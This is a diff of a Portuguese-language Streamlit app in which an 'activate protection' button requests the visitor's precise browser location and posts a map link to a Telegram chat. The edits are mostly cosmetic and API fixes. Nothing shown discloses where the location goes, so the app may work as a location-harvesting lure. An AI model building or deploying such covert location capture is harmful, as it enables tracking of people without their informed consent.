@@ -43,19 +43,8 @@ body { background:#0b0e13; color:#fff; }
     margin:auto;
 }
 .pct { font-size:44px;font-weight:bold; }
-.btn {
-    background:#3a3f46;
-    color:#fff;
-    width:100%;
-    height:55px;
-    border:none;
-    border-radius:14px;
-    font-size:18px;
-    font-weight:bold;
-}
 .alert {
     background:#3a3f00;
-    color:#fff;
     padding:16px;
     border-radius:12px;
 }
@@ -88,10 +77,10 @@ if "pedindo_geo" not in st.session_state:
 # ===============================
 if st.button("● ATIVAR PROTEÇÃO", use_container_width=True):
     st.session_state.pedindo_geo = True
-    st.experimental_rerun()
+    st.rerun()   # ✅ CORREÇÃO AQUI
 
 # ===============================
-# GEOLOCALIZAÇÃO (FASE 2)
+# GEOLOCALIZAÇÃO
 # ===============================
 if st.session_state.pedindo_geo:
 
@@ -105,23 +94,18 @@ if st.session_state.pedindo_geo:
                     lon: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 }),
-                (err) => resolve({
-                    ok: false,
-                    error: err.code
-                }),
-                { enableHighAccuracy: true, timeout: 15000 }
+                (err) => resolve({ ok:false }),
+                { enableHighAccuracy:true, timeout:15000 }
             );
         })
         """,
         key="geo_final"
     )
 
-    # ainda aguardando o usuário clicar em Permitir / Negar
     if geo is None:
         st.info("Aguardando permissão de localização…")
         st.stop()
 
-    # usuário negou ou falhou
     if not geo.get("ok"):
         st.markdown(
             "<div class='alert'>Permissão de localização negada ou indisponível.</div>",
@@ -144,8 +128,7 @@ if st.session_state.pedindo_geo:
 
     enviar_telegram(
         f"🛡️ PROTEÇÃO ATIVADA\n\n"
-        f"📍 [Localização]({mapa})\n"
-        f"🎯 Precisão: {int(geo['accuracy'])}m"
+        f"📍 [Localização]({mapa})"
     )
 
     st.success("Proteção ativada com sucesso!")
